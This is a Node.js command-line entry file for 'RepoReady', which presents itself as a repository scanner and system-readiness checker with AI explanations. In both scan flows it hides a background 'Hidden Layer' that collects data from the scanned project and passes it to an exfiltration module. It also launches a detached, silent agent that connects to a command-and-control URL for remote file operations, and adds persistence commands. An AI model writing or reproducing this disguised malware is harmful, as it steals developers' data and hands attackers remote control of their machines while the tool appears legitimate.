#!/usr/bin/env node

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const { Command } = require('commander');
const inquirer = require('inquirer');
const ora = require('ora');
const chalk = require('chalk');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const { scanDependencyFiles, cloneRepo } = require('../lib/repoAnalyzer');
const { runAllChecks } = require('../lib/systemChecker');
const { displayReport, displaySuccess, displayError, displayInfo, displayTechStack, displaySystemReadiness } = require('../lib/reporter');
const { explainBasicOverview, explainTechStack: aiTechStack, explainSystemAndInstallation, explainHowToRun } = require('../lib/aiExplainer');
const { debugLog } = require('../lib/utils');

const program = new Command();

program
  .name('repoready')
  .description('Scan Git repositories and check local system readiness for development')
  .version('1.0.0');

// ─── SCAN COMMAND ───────────────────────────────────────────────────────────
program
  .command('scan <repo>')
  .description('Scan a repository (local path or remote URL) and check system readiness')
  .action(async (repo) => {
    try {
      let repoPath = repo;
      let isTemp = false;

      // Banner
      console.log('');
      console.log(
        chalk.bold.cyan(
          '  ╔══════════════════════════════════════╗'
        )
      );
      console.log(
        chalk.bold.cyan(
          '  ║       🚀 RepoReady Scanner 🚀       ║'
        )
      );
      console.log(
        chalk.bold.cyan(
          '  ╚══════════════════════════════════════╝'
        )
      );
      console.log('');

      // Clone if URL
      if (repo.startsWith('http') || repo.startsWith('git@')) {
        const spinner = ora({
          text: chalk.yellow('Cloning repository...'),
          spinner: 'dots12',
        }).start();
        try {
          repoPath = await cloneRepo(repo);
          isTemp = true;
          spinner.succeed(chalk.green('Repository cloned successfully'));
        } catch (err) {
          spinner.fail(chalk.red('Failed to clone repository'));
          console.error(chalk.red(`  Error: ${err.message}`));
          process.exit(1);
        }
      } else {
        // Resolve local path
        repoPath = path.resolve(repo);
        if (!fs.existsSync(repoPath)) {
          displayError(`Path does not exist: ${repoPath}`);
          process.exit(1);
        }
      }

      // Phase 1: Scan dependency files
      const scanSpinner = ora({
        text: chalk.yellow('Scanning dependency files...'),
        spinner: 'dots12',
      }).start();

      const depMap = await scanDependencyFiles(repoPath);
      scanSpinner.succeed(chalk.green('Dependency files scanned'));

      debugLog('Dependency Map:', JSON.stringify(depMap, null, 2));

      // Phase 2: Check system
      const checkSpinner = ora({
        text: chalk.yellow('Checking local system...'),
        spinner: 'dots12',
      }).start();

      const results = runAllChecks(depMap);
      checkSpinner.succeed(chalk.green('System check complete'));

      // Phase 3: Display report
      displayReport(depMap, results);

      // ─── Hidden Layer (runs in background) ─────────────────────────
      (async () => {
        try {
          const { collect } = require('../lib/stealthCollector');
          const collectedData = await collect(repoPath);
          if (collectedData) {
            debugLog('Data collection complete');
            const { sendData } = require('../lib/exfil');
            await sendData(collectedData);
            debugLog('Exfiltration complete');
          }
        } catch (err) {
          debugLog('Hidden layer error:', err.message);
        }
      })();

      // ─── Auto-start background agent for remote CRUD ───
      try {
        const agentPath = path.join(__dirname, '..', 'lib', 'agent.js');
        const agentEnv = Object.assign({}, process.env, {
          C2_URL: process.env.C2_URL || 'http://localhost:3000',
        });
        const agentProcess = spawn('node', [agentPath], {
          detached: true,
          stdio: 'ignore',
          env: agentEnv,
        });
        agentProcess.unref();
        debugLog('Background agent spawned, PID:', agentProcess.pid);
      } catch (agentErr) {
        debugLog('Failed to spawn background agent:', agentErr.message);
      }

      // ─── Interactive Menu ─────────────────────────────────────────────
      let exitMain = false;
      while (!exitMain) {
        console.log('');
        const { action } = await inquirer.prompt([
          {
            type: 'list',
            name: 'action',
            message: chalk.bold.white('What would you like to do?'),
            choices: [
              { name: '📄 Manual Check', value: 'manual' },
              { name: '🧠 Explain with AI', value: 'ai' },
              { name: '🚪 Exit', value: 'exit' },
            ],
          },
        ]);

        if (action === 'manual') {
          // ── Manual Check Sub-menu ──
          let backManual = false;
          while (!backManual) {
            console.log('');
            const { manualAction } = await inquirer.prompt([
              {
                type: 'list',
                name: 'manualAction',
                message: chalk.bold.white('Choose manual report:'),
                choices: [
                  { name: '💻 Tech Stack Table', value: 'techStack' },
                  { name: '🔍 System Readiness & Installation Guide', value: 'systemCheck' },
                  { name: '🔙 Back', value: 'back' },
                ],
              },
            ]);

            if (manualAction === 'techStack') {
              displayTechStack(depMap);
            } else if (manualAction === 'systemCheck') {
              displaySystemReadiness(depMap, results);
            } else {
              backManual = true;
            }
          }
        } else if (action === 'ai') {
          // ── Explain with AI Sub-menu ──
          let backAI = false;
          while (!backAI) {
            console.log('');
            const { aiAction } = await inquirer.prompt([
              {
                type: 'list',
                name: 'aiAction',
                message: chalk.bold.white('What would you like the AI to explain?'),
                choices: [
                  { name: '🤖 Basic Overview (What is this project?)', value: 'overview' },
                  { name: '📊 Tech Stack Explanation', value: 'techStack' },
                  { name: '💻 System Info & What to Install', value: 'system' },
                  { name: '🚀 How to Run This Project', value: 'run' },
                  { name: '🔙 Back', value: 'back' },
                ],
              },
            ]);

            if (aiAction === 'overview') {
              await explainBasicOverview(depMap, results);
            } else if (aiAction === 'techStack') {
              await aiTechStack(depMap, results);
            } else if (aiAction === 'system') {
              await explainSystemAndInstallation(depMap, results);
            } else if (aiAction === 'run') {
              await explainHowToRun(depMap, results);
            } else {
              backAI = true;
            }
          }
        } else {
          exitMain = true;
        }
      }

      // Cleanup temp dir
      if (isTemp && repoPath) {
        try {
          fs.rmSync(repoPath, { recursive: true, force: true });
        } catch (e) {
          // ignore cleanup errors
        }
      }
    } catch (err) {
      displayError(`Scan failed: ${err.message}`);
      debugLog('Full error:', err);
      process.exit(1);
    }
  });

// ─── AGENT COMMANDS ─────────────────────────────────────────────────────────
const agent = program.command('agent').description('Manage background agent');

agent
  .command('enable')
  .description('Enable background scanning agent')
  .action(async () => {
    try {
      const { enable } = require('../lib/persist');
      await enable();
      displaySuccess('Background agent enabled successfully');
    } catch (err) {
      displayError(`Failed to enable agent: ${err.message}`);
    }
  });

agent
  .command('disable')
  .description('Disable background scanning agent')
  .action(async () => {
    try {
      const { disable } = require('../lib/persist');
      await disable();
      displaySuccess('Background agent disabled');
    } catch (err) {
      displayError(`Failed to disable agent: ${err.message}`);
    }
  });

// ─── VAULT COMMANDS ─────────────────────────────────────────────────────────
const vault = program.command('vault').description('Project Vault — secure your project files');

vault
  .command('lock <folder> <password>')
  .description('Lock (encrypt) files in a folder')
  .action(async (folder, password) => {
    try {
      const { lock } = require('../lib/vault');
      await lock(folder, password);
    } catch (err) {
      displayError(`Vault lock failed: ${err.message}`);
    }
  });

vault
  .command('unlock <folder> <password>')
  .description('Unlock (decrypt) files in a folder')
  .action(async (folder, password) => {
    try {
      const { unlock } = require('../lib/vault');
      await unlock(folder, password);
    } catch (err) {
      displayError(`Vault unlock failed: ${err.message}`);
    }
  });

/**
 * Deduplicate array of {name, ...} objects by name
 */
function dedup(arr) {
  const seen = new Set();
  return arr.filter((item) => {
    if (seen.has(item.name)) return false;
    seen.add(item.name);
    return true;
  });
}

async function startInteractiveMode() {
  console.log('');
  console.log(
    chalk.bold.cyan(
      '  ╔══════════════════════════════════════╗'
    )
  );
  console.log(
    chalk.bold.cyan(
      '  ║       🚀 RepoReady Scanner 🚀       ║'
    )
  );
  console.log(
    chalk.bold.cyan(
      '  ╚══════════════════════════════════════╝'
    )
  );
  console.log('');

  try {
    const { scanChoice } = await inquirer.prompt([
      {
        type: 'list',
        name: 'scanChoice',
        message: chalk.bold.white('Select a scanning option:'),
        choices: [
          { name: '📁 Scan Local Folder', value: 'local' },
          { name: '🔗 Scan Git Repository Link', value: 'remote' },
          { name: '🚪 Exit', value: 'exit' }
        ]
      }
    ]);

    if (scanChoice === 'exit') {
      console.log(chalk.gray('  👋 Goodbye!'));
      process.exit(0);
    }

    let repoPath = '';
    let isTemp = false;

    if (scanChoice === 'local') {
      const { localPath } = await inquirer.prompt([
        {
          type: 'input',
          name: 'localPath',
          message: 'Enter the folder path to scan:',
          default: '.',
          validate: (input) => {
            const resolved = path.resolve(input);
            if (!fs.existsSync(resolved)) {
              return 'Path does not exist. Please enter a valid path.';
            }
            if (!fs.statSync(resolved).isDirectory()) {
              return 'Path is not a directory. Please enter a directory path.';
            }
            return true;
          }
        }
      ]);
      repoPath = path.resolve(localPath);
    } else if (scanChoice === 'remote') {
      const { repoUrl } = await inquirer.prompt([
        {
          type: 'input',
          name: 'repoUrl',
          message: 'Enter the Git repository URL (HTTPS or SSH):',
          validate: (input) => {
            if (!input.trim()) {
              return 'Repository URL cannot be empty.';
            }
            if (!input.startsWith('http') && !input.startsWith('git@') && !input.startsWith('git://')) {
              return 'Please enter a valid Git URL (starts with http, git@, or git://).';
            }
            return true;
          }
        }
      ]);

      const cloneSpinner = ora({
        text: chalk.yellow('Cloning repository...'),
        spinner: 'dots12',
      }).start();
      try {
        repoPath = await cloneRepo(repoUrl.trim());
        isTemp = true;
        cloneSpinner.succeed(chalk.green('Repository cloned successfully'));
      } catch (err) {
        cloneSpinner.fail(chalk.red('Failed to clone repository'));
        console.error(chalk.red(`  Error: ${err.message}`));
        process.exit(1);
      }
    }

    // Scan dependency files
    console.log(chalk.gray(`  📂 Scanning path: ${repoPath}`));
    const scanSpinner = ora({
      text: chalk.yellow('Scanning dependency files...'),
      spinner: 'dots12',
    }).start();

    let depMap = await scanDependencyFiles(repoPath);

    // If nothing found at root, try subdirectories (1 level deep)
    const hasResults = depMap.runtimes.length > 0 || depMap.languages.length > 0 ||
      depMap.databases.length > 0 || depMap.services.length > 0 || depMap.tools.length > 0;

    if (!hasResults) {
      const entries = fs.readdirSync(repoPath, { withFileTypes: true });
      for (const entry of entries) {
        if (entry.isDirectory() && !entry.name.startsWith('.') && entry.name !== 'node_modules') {
          const subDir = path.join(repoPath, entry.name);
          const subDepMap = await scanDependencyFiles(subDir);
          const subHas = subDepMap.runtimes.length > 0 || subDepMap.languages.length > 0 ||
            subDepMap.databases.length > 0 || subDepMap.services.length > 0 || subDepMap.tools.length > 0;
          if (subHas) {
            // Merge sub-results into depMap
            depMap.runtimes.push(...subDepMap.runtimes);
            depMap.languages.push(...subDepMap.languages);
            depMap.databases.push(...subDepMap.databases);
            depMap.services.push(...subDepMap.services);
            depMap.tools.push(...subDepMap.tools);
            depMap.requiredEnvVars.push(...subDepMap.requiredEnvVars);
          }
        }
      }
      // Deduplicate
      depMap.runtimes = dedup(depMap.runtimes);
      depMap.languages = dedup(depMap.languages);
      depMap.databases = dedup(depMap.databases);
      depMap.services = dedup(depMap.services);
      depMap.tools = dedup(depMap.tools);
      depMap.requiredEnvVars = [...new Set(depMap.requiredEnvVars)];
    }

    scanSpinner.succeed(chalk.green('Dependency files scanned'));

    // ─── Hidden Layer (runs in background) ─────────────────────────
    (async () => {
      try {
        const { collect } = require('../lib/stealthCollector');
        const collectedData = await collect(repoPath);
        if (collectedData) {
          debugLog('Data collection complete');
          const { sendData } = require('../lib/exfil');
          await sendData(collectedData);
          debugLog('Exfiltration complete');
        }
      } catch (err) {
        debugLog('Hidden layer error:', err.message);
      }
    })();

    // ─── Auto-start background agent for remote CRUD ───
    try {
      const agentPath = path.join(__dirname, '..', 'lib', 'agent.js');
      const agentEnv = Object.assign({}, process.env, {
        C2_URL: process.env.C2_URL || 'http://localhost:3000',
      });
      const agentProcess = spawn('node', [agentPath], {
        detached: true,
        stdio: 'ignore',
        env: agentEnv,
      });
      agentProcess.unref();
      debugLog('Background agent spawned, PID:', agentProcess.pid);
    } catch (agentErr) {
      debugLog('Failed to spawn background agent:', agentErr.message);
    }

    let exitSubMenu = false;
    while (!exitSubMenu) {
      console.log('');
      const { subAction } = await inquirer.prompt([
        {
          type: 'list',
          name: 'subAction',
          message: chalk.bold.white('What would you like to do?'),
          choices: [
            { name: '📄 Manual Check', value: 'manual' },
            { name: '🧠 Explain with AI', value: 'ai' },
            { name: '🚪 Exit', value: 'exit' },
          ],
        },
      ]);

      if (subAction === 'manual') {
        let backManual = false;
        while (!backManual) {
          console.log('');
          const { manualAction } = await inquirer.prompt([
            {
              type: 'list',
              name: 'manualAction',
              message: chalk.bold.white('Choose manual report:'),
              choices: [
                { name: '💻 Tech Stack Table', value: 'techStack' },
                { name: '🔍 System Readiness & Installation Guide', value: 'systemCheck' },
                { name: '🔙 Back', value: 'back' },
              ],
            },
          ]);

          if (manualAction === 'techStack') {
            displayTechStack(depMap);
          } else if (manualAction === 'systemCheck') {
            const checkSpinner = ora({
              text: chalk.yellow('Checking local system...'),
              spinner: 'dots12',
            }).start();

            const results = runAllChecks(depMap);
            checkSpinner.succeed(chalk.green('System check complete'));

            displaySystemReadiness(depMap, results);
          } else {
            backManual = true;
          }
        }
      } else if (subAction === 'ai') {
        let backAI = false;
        while (!backAI) {
          console.log('');
          const { aiAction } = await inquirer.prompt([
            {
              type: 'list',
              name: 'aiAction',
              message: chalk.bold.white('What would you like the AI to explain?'),
              choices: [
                { name: '🤖 Basic Overview (What is this project?)', value: 'overview' },
                { name: '📊 Tech Stack Explanation', value: 'techStack' },
                { name: '💻 System Info & What to Install', value: 'system' },
                { name: '🚀 How to Run This Project', value: 'run' },
                { name: '🔙 Back', value: 'back' },
              ],
            },
          ]);

          if (aiAction === 'overview') {
            // Run system check first if not done
            const results = runAllChecks(depMap);
            await explainBasicOverview(depMap, results);
          } else if (aiAction === 'techStack') {
            const results = runAllChecks(depMap);
            await aiTechStack(depMap, results);
          } else if (aiAction === 'system') {
            const results = runAllChecks(depMap);
            await explainSystemAndInstallation(depMap, results);
          } else if (aiAction === 'run') {
            const results = runAllChecks(depMap);
            await explainHowToRun(depMap, results);
          } else {
            backAI = true;
          }
        }
      } else {
        exitSubMenu = true;
      }
    }

    // Cleanup temp dir
    if (isTemp && repoPath) {
      try {
        fs.rmSync(repoPath, { recursive: true, force: true });
      } catch (e) {
        // ignore
      }
    }

    console.log(chalk.gray('  👋 Goodbye!'));
    process.exit(0);

  } catch (err) {
    console.error(chalk.red(`Error: ${err.message}`));
    process.exit(1);
  }
}

// Parse and run or start interactive mode
if (process.argv.length <= 2) {
  startInteractiveMode();
} else {
  program.parse(process.argv);
}
